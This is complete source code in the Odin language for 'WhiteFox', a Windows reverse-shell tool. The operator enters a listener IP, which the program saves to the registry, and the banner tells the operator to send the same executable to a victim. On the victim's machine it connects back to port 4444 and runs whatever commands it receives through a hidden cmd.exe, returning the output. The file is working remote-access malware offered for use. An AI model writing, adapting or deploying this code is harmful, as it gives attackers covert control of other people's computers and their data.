package main

import "core:fmt"
import "core:net"
import "core:os"
import "core:strings"
import "core:sys/windows"

foreign import advapi32 "system:Advapi32.lib"

@(default_calling_convention="stdcall")
foreign advapi32 {
    RegCreateKeyExW  :: proc(hKey: windows.HKEY, lpSubKey: windows.wstring, Reserved: windows.DWORD, lpClass: windows.wstring, dwOptions: windows.DWORD, samDesired: windows.REGSAM, lpSecurityAttributes: ^windows.SECURITY_ATTRIBUTES, phkResult: ^windows.HKEY, lpdwDisposition: ^windows.DWORD) -> windows.LSTATUS ---
    RegOpenKeyExW    :: proc(hKey: windows.HKEY, lpSubKey: windows.wstring, ulOptions: windows.DWORD, samDesired: windows.REGSAM, phkResult: ^windows.HKEY) -> windows.LSTATUS ---
    RegQueryValueExW :: proc(hKey: windows.HKEY, lpValueName: windows.wstring, lpReserved: ^windows.DWORD, lpType: ^windows.DWORD, lpData: ^windows.BYTE, lpcbData: ^windows.DWORD) -> windows.LSTATUS ---
    RegSetValueExW   :: proc(hKey: windows.HKEY, lpValueName: windows.wstring, Reserved: windows.DWORD, dwType: windows.DWORD, lpData: ^windows.BYTE, cbData: windows.DWORD) -> windows.LSTATUS ---
    RegCloseKey      :: proc(hKey: windows.HKEY) -> windows.LSTATUS ---
}

REG_PATH :: "Software\\WhiteFox"
REG_KEY  :: "T_Addr"

main :: proc() {
    target_ip := get_config_ip()

    if target_ip == "" {
        show_logo_with_msg()
        fmt.print("\nEnter target IP: ")
        
        buf: [128]byte
        n, _ := os.read(os.stdin, buf[:])
        input_ip := strings.trim_space(string(buf[:n]))

        if len(input_ip) > 0 {
            save_config_ip(input_ip)
            fmt.printf("\n[+] Target Locked: %s\n", input_ip)
            fmt.println("[!] You can now send this EXE to the target.")
            fmt.println("[!] Note: Commands from listener must use 'powershell' prefix.")
        }
        return
    }

    run_agent(target_ip)
}

run_agent :: proc(ip: string) {
    addr_str := fmt.tprintf("%s:4444", ip)
    endpoint, _ := net.parse_endpoint(addr_str)
    socket, dial_err := net.dial_tcp(endpoint)
    if dial_err != nil do return
    defer net.close(socket)

    for {
        buffer: [4096]byte
        bytes_read, _ := net.recv_tcp(socket, buffer[:])
        if bytes_read <= 0 do break

        input := strings.trim_space(string(buffer[:bytes_read]))
        if input == "exit" do break

        h_read, h_write: windows.HANDLE
        sa := windows.SECURITY_ATTRIBUTES{nLength = size_of(windows.SECURITY_ATTRIBUTES), bInheritHandle = true}
        windows.CreatePipe(&h_read, &h_write, &sa, 0)
        windows.SetHandleInformation(h_read, windows.HANDLE_FLAG_INHERIT, 0)

        si := windows.STARTUPINFOW{
            cb = u32(size_of(windows.STARTUPINFOW)),
            dwFlags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW,
            wShowWindow = 0,
            hStdOutput = h_write,
            hStdError = h_write,
        }

        pi: windows.PROCESS_INFORMATION
        cmd_u16 := windows.utf8_to_utf16(fmt.tprintf("cmd.exe /c %s\x00", input))
        
        if windows.CreateProcessW(nil, cast(windows.wstring)raw_data(cmd_u16), nil, nil, true, 0x08000000, nil, nil, &si, &pi) {
            windows.CloseHandle(h_write)
            for {
                out_buf: [4096]byte
                n_read: u32
                if !windows.ReadFile(h_read, raw_data(out_buf[:]), 4096, &n_read, nil) || n_read == 0 do break
                net.send_tcp(socket, out_buf[:n_read])
            }
            windows.CloseHandle(pi.hProcess); windows.CloseHandle(pi.hThread)
        }
        windows.CloseHandle(h_read)
    }
}

save_config_ip :: proc(ip: string) {
    hkey: windows.HKEY
    path := windows.utf8_to_utf16(REG_PATH)
    val_name := windows.utf8_to_utf16(REG_KEY)
    val_data := windows.utf8_to_utf16(ip)
    if RegCreateKeyExW(windows.HKEY_CURRENT_USER, cast(windows.wstring)raw_data(path), 0, nil, 0, windows.KEY_WRITE, nil, &hkey, nil) == 0 {
        RegSetValueExW(hkey, cast(windows.wstring)raw_data(val_name), 0, windows.REG_SZ, cast(^windows.BYTE)raw_data(val_data), u32(len(val_data) * 2))
        RegCloseKey(hkey)
    }
}

get_config_ip :: proc() -> string {
    hkey: windows.HKEY
    path := windows.utf8_to_utf16(REG_PATH)
    val_name := windows.utf8_to_utf16(REG_KEY)
    if RegOpenKeyExW(windows.HKEY_CURRENT_USER, cast(windows.wstring)raw_data(path), 0, windows.KEY_READ, &hkey) != 0 do return ""
    defer RegCloseKey(hkey)
    buf: [256]u16
    size := u32(size_of(buf))
    if RegQueryValueExW(hkey, cast(windows.wstring)raw_data(val_name), nil, nil, cast(^windows.BYTE)&buf[0], &size) != 0 do return ""
    res, _ := windows.utf16_to_utf8(buf[:])
    return strings.trim_right(res, "\x00")
}

show_logo_with_msg :: proc() {
    fmt.println(` 
____               ___ ___                         ________                    
` + "`" + `Mb(      db      )d' ` + "`" + `MM      68b                 ` + "`" + `MMMMMMM                    
 YM.     ,PM.     ,P   MM      Y89   /                 MM    \                    
 ` + "`" + `Mb     d'Mb     d'   MM  __  ___  /M      ____    MM       _____  ____   ___ 
  YM.   ,P YM.   ,P    MM 6MMb ` + "`" + `MM /MMMMM  6MMMMb   MM   ,  6MMMMMb ` + "`" + `MM(   )P' 
  ` + "`" + `Mb   d' ` + "`" + `Mb   d'    MMM9 ` + "`" + `Mb MM  MM    6M'   ` + "`" + `Mb MMMMMM 6M'   ` + "`" + `Mb ` + "`" + `MM` + "`" + ` ,P   
   YM. ,P   YM. ,P     MM'   MM MM  MM    MM    MM MM   ` + "`" + ` MM     MM  ` + "`" + `MM,P    
   ` + "`" + `Mb d'   ` + "`" + `Mb d'     MM    MM MM  MM    MMMMMMMM MM     MM     MM   ` + "`" + `MM.    
    YM,P     YM,P      MM    MM MM  MM    MM       MM     MM     MM   d` + "`" + `MM.   
    ` + "`" + `MM'     ` + "`" + `MM'      MM    MM MM  YM.  ,YM    d9 MM     YM.   ,M9  d' ` + "`" + `MM.  
     YP        YP      _MM_  _MM_MM_  YMMM9 YMMMM9 _MM_     YMMMMM9 _d_  _)MM_ 
    `)
    fmt.println("-------------------------------------------------------------------------------")
    fmt.println("Hello! This is the developer of WhiteFox.")
    fmt.println("Due to x86 conversion issues, the entire code had to be redesigned.")
    fmt.println("Regardless, the working is the same. One major difference: when you run the")
    fmt.println("exe first time, you will put listener IP AND THEN send that same exe to the target.")
    fmt.println("This is the new model of the code.")
    fmt.println("\nFinal note: once you get a connection, you will need to type powershell each")
    fmt.println("time for execution (e.g., 'powershell ls', 'powershell whoami', etc.).")
    fmt.println("-------------------------------------------------------------------------------")
}
